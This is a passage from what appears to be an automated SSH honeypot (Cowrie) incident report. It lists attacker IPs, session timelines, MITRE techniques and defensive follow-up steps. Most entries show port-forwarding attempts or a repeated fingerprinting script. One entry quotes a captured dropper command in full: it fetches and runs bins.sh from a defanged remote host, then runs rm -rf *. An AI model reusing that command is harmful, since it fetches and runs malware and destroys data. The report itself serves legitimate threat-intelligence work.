| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:21:20` | `cowrie.session.connect` |
| `2026-07-30 01:21:20` | `cowrie.client.version` |
| `2026-07-30 01:21:20` | `cowrie.client.kex` |
| `2026-07-30 01:21:23` | `cowrie.login.success` |
| `2026-07-30 01:21:24` | `cowrie.session.params` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.success` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:24` | `cowrie.command.input` |
| `2026-07-30 01:21:25` | `cowrie.log.closed` |
| `2026-07-30 01:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca85d5b67a8

| Field | Detail |
|---|---|
| **Source IP** | `84.82.14[.]214` |
| **First Seen** | 2026-07-30 01:21 |
| **Last Seen** | 2026-07-30 01:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:21:58` | `cowrie.session.connect` |
| `2026-07-30 01:21:58` | `cowrie.client.version` |
| `2026-07-30 01:21:58` | `cowrie.client.kex` |
| `2026-07-30 01:22:00` | `cowrie.login.success` |
| `2026-07-30 01:22:00` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:22:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.82.14[.]214` to AbuseIPDB if not already reported
- [ ] Block `84.82.14[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71065280ce4

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-07-30 01:22 |
| **Last Seen** | 2026-07-30 01:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:22:10` | `cowrie.session.connect` |
| `2026-07-30 01:22:11` | `cowrie.client.version` |
| `2026-07-30 01:22:11` | `cowrie.client.kex` |
| `2026-07-30 01:22:14` | `cowrie.login.success` |
| `2026-07-30 01:22:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a970e0be4d15

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]230` |
| **First Seen** | 2026-07-30 01:22 |
| **Last Seen** | 2026-07-30 01:22 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://31.56.209[.]153/bins.sh; curl -O hxxp://31.56.209[.]153/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf *` |
| **Download Attempts** | hxxp://31.56.209[.]153/bins.sh, hxxp://31.56.209[.]153/bins.sh, hxxp://31.56.209[.]153/release/$bin |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:22:21` | `cowrie.session.connect` |
| `2026-07-30 01:22:25` | `cowrie.client.version` |
| `2026-07-30 01:22:25` | `cowrie.client.kex` |
| `2026-07-30 01:22:35` | `cowrie.login.success` |
| `2026-07-30 01:22:42` | `cowrie.session.params` |
| `2026-07-30 01:22:42` | `cowrie.command.input` |
| `2026-07-30 01:22:43` | `cowrie.session.file_download` |
| `2026-07-30 01:22:43` | `cowrie.session.file_download` |
| `2026-07-30 01:22:43` | `cowrie.session.file_download` |
| `2026-07-30 01:22:43` | `cowrie.session.file_download.failed` |
| `2026-07-30 01:22:45` | `cowrie.log.closed` |
| `2026-07-30 01:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]230` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066bd88107d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:22 |
| **Last Seen** | 2026-07-30 01:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:22:46` | `cowrie.session.connect` |
| `2026-07-30 01:22:46` | `cowrie.client.version` |
| `2026-07-30 01:22:46` | `cowrie.client.kex` |
| `2026-07-30 01:22:47` | `cowrie.login.success` |
| `2026-07-30 01:22:49` | `cowrie.session.params` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.success` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.command.input` |
| `2026-07-30 01:22:49` | `cowrie.log.closed` |
| `2026-07-30 01:22:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c130f46f9f5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:24 |
| **Last Seen** | 2026-07-30 01:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:24:13` | `cowrie.session.connect` |
| `2026-07-30 01:24:14` | `cowrie.client.version` |
| `2026-07-30 01:24:14` | `cowrie.client.kex` |
| `2026-07-30 01:24:15` | `cowrie.login.success` |
| `2026-07-30 01:24:16` | `cowrie.session.params` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.success` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:16` | `cowrie.command.input` |
| `2026-07-30 01:24:17` | `cowrie.log.closed` |
| `2026-07-30 01:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a87f84d277

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:25 |
| **Last Seen** | 2026-07-30 01:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:25:47` | `cowrie.session.connect` |
| `2026-07-30 01:25:47` | `cowrie.client.version` |
| `2026-07-30 01:25:47` | `cowrie.client.kex` |
| `2026-07-30 01:25:48` | `cowrie.login.success` |
| `2026-07-30 01:25:49` | `cowrie.session.params` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.success` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:49` | `cowrie.command.input` |
| `2026-07-30 01:25:50` | `cowrie.log.closed` |
| `2026-07-30 01:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45dbf7b4b8d9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]92` |
| **First Seen** | 2026-07-30 01:26 |
| **Last Seen** | 2026-07-30 01:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:26:32` | `cowrie.session.connect` |
| `2026-07-30 01:26:33` | `cowrie.login.success` |
| `2026-07-30 01:26:33` | `cowrie.session.params` |
| `2026-07-30 01:26:34` | `cowrie.command.input` |
| `2026-07-30 01:26:35` | `cowrie.command.input` |
| `2026-07-30 01:26:35` | `cowrie.command.input` |
| `2026-07-30 01:26:36` | `cowrie.command.input` |
| `2026-07-30 01:26:36` | `cowrie.command.failed` |
| `2026-07-30 01:26:36` | `cowrie.log.closed` |
| `2026-07-30 01:26:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]92` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90336893bd12

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:27 |
| **Last Seen** | 2026-07-30 01:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:27:18` | `cowrie.session.connect` |
| `2026-07-30 01:27:18` | `cowrie.client.version` |
| `2026-07-30 01:27:18` | `cowrie.client.kex` |
| `2026-07-30 01:27:20` | `cowrie.login.success` |
| `2026-07-30 01:27:21` | `cowrie.session.params` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.success` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.command.input` |
| `2026-07-30 01:27:21` | `cowrie.log.closed` |
| `2026-07-30 01:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9915ef7b82c1

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-30 01:28 |
| **Last Seen** | 2026-07-30 01:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:28:27` | `cowrie.session.connect` |
| `2026-07-30 01:28:27` | `cowrie.client.version` |
| `2026-07-30 01:28:27` | `cowrie.client.kex` |
| `2026-07-30 01:28:29` | `cowrie.login.success` |
| `2026-07-30 01:28:29` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1daf55dad5f4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:28 |
| **Last Seen** | 2026-07-30 01:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:28:50` | `cowrie.session.connect` |
| `2026-07-30 01:28:51` | `cowrie.client.version` |
| `2026-07-30 01:28:51` | `cowrie.client.kex` |
| `2026-07-30 01:28:52` | `cowrie.login.success` |
| `2026-07-30 01:28:53` | `cowrie.session.params` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.success` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.command.input` |
| `2026-07-30 01:28:53` | `cowrie.log.closed` |
| `2026-07-30 01:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa15bca8d94f

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-30 01:29 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:29:57` | `cowrie.session.connect` |
| `2026-07-30 01:29:58` | `cowrie.client.version` |
| `2026-07-30 01:29:58` | `cowrie.client.kex` |
| `2026-07-30 01:30:00` | `cowrie.login.success` |
| `2026-07-30 01:30:00` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e023ffb97bfe

| Field | Detail |
|---|---|
| **Source IP** | `221.199.172[.]66` |
| **First Seen** | 2026-07-30 01:29 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:29:59` | `cowrie.session.connect` |
| `2026-07-30 01:29:59` | `cowrie.client.version` |
| `2026-07-30 01:29:59` | `cowrie.client.kex` |
| `2026-07-30 01:30:02` | `cowrie.login.success` |
| `2026-07-30 01:30:02` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0325be492b3

| Field | Detail |
|---|---|
| **Source IP** | `60.223.250[.]50` |
| **First Seen** | 2026-07-30 01:30 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:30:05` | `cowrie.session.connect` |
| `2026-07-30 01:30:06` | `cowrie.client.version` |
| `2026-07-30 01:30:06` | `cowrie.client.kex` |
| `2026-07-30 01:30:08` | `cowrie.login.success` |
| `2026-07-30 01:30:09` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.223.250[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.223.250[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e7590ef6cdf

| Field | Detail |
|---|---|
| **Source IP** | `125.72.150[.]250` |
| **First Seen** | 2026-07-30 01:30 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:30:12` | `cowrie.session.connect` |
| `2026-07-30 01:30:13` | `cowrie.client.version` |
| `2026-07-30 01:30:13` | `cowrie.client.kex` |
| `2026-07-30 01:30:15` | `cowrie.login.success` |
| `2026-07-30 01:30:16` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.72.150[.]250` to AbuseIPDB if not already reported
- [ ] Block `125.72.150[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd6b1c0a2fa9

| Field | Detail |
|---|---|
| **Source IP** | `14.23.77[.]27` |
| **First Seen** | 2026-07-30 01:30 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:30:16` | `cowrie.session.connect` |
| `2026-07-30 01:30:16` | `cowrie.client.version` |
| `2026-07-30 01:30:16` | `cowrie.client.kex` |
| `2026-07-30 01:30:18` | `cowrie.login.success` |
| `2026-07-30 01:30:18` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.23.77[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.23.77[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f11e900097

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:30 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:30:23` | `cowrie.session.connect` |
| `2026-07-30 01:30:24` | `cowrie.client.version` |
| `2026-07-30 01:30:24` | `cowrie.client.kex` |
| `2026-07-30 01:30:25` | `cowrie.login.success` |
| `2026-07-30 01:30:26` | `cowrie.session.params` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.success` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:26` | `cowrie.command.input` |
| `2026-07-30 01:30:27` | `cowrie.log.closed` |
| `2026-07-30 01:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f84e6c90bc

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-07-30 01:30 |
| **Last Seen** | 2026-07-30 01:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:30:24` | `cowrie.session.connect` |
| `2026-07-30 01:30:24` | `cowrie.client.version` |
| `2026-07-30 01:30:24` | `cowrie.client.kex` |
| `2026-07-30 01:30:26` | `cowrie.login.success` |
| `2026-07-30 01:30:27` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
